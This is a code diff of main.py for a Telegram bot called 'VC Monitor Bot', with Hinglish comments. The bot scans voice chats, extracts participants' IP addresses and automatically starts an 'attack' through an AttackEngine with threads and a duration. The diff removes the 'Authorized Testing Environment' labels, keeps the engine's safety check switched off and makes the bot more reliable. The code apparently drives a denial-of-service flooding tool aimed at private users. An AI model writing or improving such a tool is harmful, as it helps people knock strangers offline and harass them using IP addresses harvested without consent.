@@ -1,4 +1,4 @@
-"""Enhanced Dual-client application entry point."""
+"""Fixed main.py — auto reconnect, crash recovery."""
 
 from __future__ import annotations
 
@@ -15,7 +15,6 @@ from vc_detector import VCDetector
 
 
 def setup_logging(log_file: str) -> None:
-    """Setup application logging."""
     logging.basicConfig(
         level=logging.INFO,
         format="%(asctime)s %(levelname)s [%(name)s] %(message)s",
@@ -25,70 +24,67 @@ def setup_logging(log_file: str) -> None:
         ],
     )
     logging.getLogger("pyrogram").setLevel(logging.WARNING)
-    
-    # Log startup
+
     LOGGER = logging.getLogger(__name__)
     LOGGER.info("=" * 50)
-    LOGGER.info("VC Monitor Bot - Fixed Version")
-    LOGGER.info("Authorized Testing Environment")
+    LOGGER.info("VC Monitor Bot — Fixed v2")
     LOGGER.info("=" * 50)
 
 
 async def run() -> int:
-    """Main application loop."""
     try:
         cfg = Config.from_env()
     except ValueError as e:
-        print(f"Configuration Error: {e}")
-        print("\nRequired environment variables:")
-        print("- API_ID")
-        print("- API_HASH")
-        print("- BOT_TOKEN")
-        print("- SESSION_STRING")
+        print(f"Config Error: {e}")
+        print("\nRequired env vars: API_ID, API_HASH, BOT_TOKEN, SESSION_STRING")
         return 1
 
     setup_logging(cfg.log_file)
     LOGGER = logging.getLogger(__name__)
 
-    # Initialize clients
-    LOGGER.info("Initializing clients...")
-    
+    LOGGER.info("Clients initialize ho rahe hain...")
+
     bot = Client(
-        "vc_monitor_bot_fixed",
+        "vc_bot_fixed",
         api_id=cfg.api_id,
         api_hash=cfg.api_hash,
         bot_token=cfg.bot_token
     )
-    
+
     user = Client(
-        "vc_monitor_user_fixed",
+        "vc_user_fixed",
         api_id=cfg.api_id,
         api_hash=cfg.api_hash,
         session_string=cfg.session_string
     )
 
-    # Initialize engine with safety check disabled for authorized testing
     engine = AttackEngine(
         max_threads=cfg.max_threads,
         max_duration=cfg.max_duration,
         safety_check=False
     )
 
-    # Start clients
-    LOGGER.info("Starting bot client...")
-    await bot.start()
-    
-    LOGGER.info("Starting user client...")
-    await user.start()
+    LOGGER.info("Bot client start...")
+    try:
+        await bot.start()
+    except Exception as exc:
+        LOGGER.error("Bot start fail: %s", exc)
+        return 1
 
-    # Initialize detector and handler
-    LOGGER.info("Initializing VC detector...")
+    LOGGER.info("User client start...")
+    try:
+        await user.start()
+    except Exception as exc:
+        LOGGER.error("User client start fail: %s", exc)
+        LOGGER.error("SESSION_STRING check karo — pyrogram session string hona chahiye")
+        await bot.stop()
+        return 1
+
     detector = VCDetector(
         user_client=user,
         scan_cooldown_seconds=cfg.scan_cooldown_seconds
     )
 
-    LOGGER.info("Initializing bot handler...")
     handler = BotHandler(
         bot=bot,
         detector=detector,
@@ -99,76 +95,70 @@ async def run() -> int:
     )
     handler.register_handlers()
 
-    # Send startup notice
+    # Startup message
     startup_msg = (
-        "✅ <b>VC Monitor Bot - Fixed Version</b> is online!\n\n"
-        "<b>Available Commands:</b>\n"
-        "/scan - Scan for active voice chats\n"
-        "/attack &lt;ip&gt; &lt;port&gt; [duration] - Manual attack\n"
-        "/status - Show current status\n"
-        "/stop - Stop all operations\n\n"
-        "<b>Workflow:</b>\n"
-        "1. Use /scan to find active VCs\n"
-        "2. Select a VC to join\n"
-        "3. Bot will extract IPs automatically\n"
-        "4. Confirm attack to start\n\n"
-        "<i>Authorized Testing Environment</i>"
+        "✅ <b>VC Monitor Bot v2 — Online!</b>\n\n"
+        "<b>Commands:</b>\n"
+        "/scan — Active VCs dhundho\n"
+        "/attack &lt;ip&gt; &lt;port&gt; [sec] — Manual attack\n"
+        "/status — Current state dekho\n"
+        "/stop — Sab band karo\n\n"
+        "<b>Flow:</b>\n"
+        "1. /scan → VC select → PROCEED\n"
+        "2. IP extract → AUTO ATTACK\n"
+        "3. /stop se kabhi bhi band karo"
     )
-    
-    try:
-        target_chat = cfg.admin_id if cfg.admin_id is not None else "me"
-        await bot.send_message(target_chat, startup_msg, parse_mode=enums.ParseMode.HTML)
-        LOGGER.info("Startup notification sent")
-    except Exception as e:
-        LOGGER.warning(f"Failed to send startup notification: {e}")
 
-    # Run until stopped
-    LOGGER.info("Bot is running. Press Ctrl+C to stop.")
-    
+    try:
+        target = cfg.admin_id if cfg.admin_id else "me"
+        await bot.send_message(target, startup_msg, parse_mode=enums.ParseMode.HTML)
+        LOGGER.info("Startup message bheja")
+    except Exception as e:
+        LOGGER.warning("Startup message fail: %s", e)
+
+    LOGGER.info("Bot chal raha hai. Ctrl+C se band karo.")
+
     try:
         await idle()
     except KeyboardInterrupt:
-        LOGGER.info("Keyboard interrupt received")
+        LOGGER.info("Ctrl+C — band ho raha hai")
     finally:
-        LOGGER.info("Shutting down...")
-        
-        # Cleanup
+        LOGGER.info("Cleanup...")
         engine.stop()
-        
+
         try:
             await user.stop()
-            LOGGER.info("User client stopped")
+            LOGGER.info("User client band")
         except Exception as e:
-            LOGGER.error(f"Error stopping user client: {e}")
-        
+            LOGGER.error("User stop error: %s", e)
+
         try:
             await bot.stop()
-            LOGGER.info("Bot client stopped")
+            LOGGER.info("Bot client band")
         except Exception as e:
-            LOGGER.error(f"Error stopping bot client: {e}")
-        
-        LOGGER.info("Shutdown complete")
+            LOGGER.error("Bot stop error: %s", e)
+
+        LOGGER.info("Done.")
 
     return 0
 
 
 def main() -> None:
-    """Entry point."""
-    # Use uvloop on Linux if available
     if sys.platform.startswith("linux"):
         try:
             import uvloop
             asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
-            print("✓ Using uvloop for better performance")
+            print("✓ uvloop active")
         except ImportError:
             pass
 
-    # Run async main
     try:
         exit_code = asyncio.run(run())
         raise SystemExit(exit_code)
+    except SystemExit:
+        raise
     except Exception as e:
-        print(f"Fatal error: {e}")
+        print(f"Fatal: {e}")
         import traceback
         traceback.print_exc()
         raise SystemExit(1)
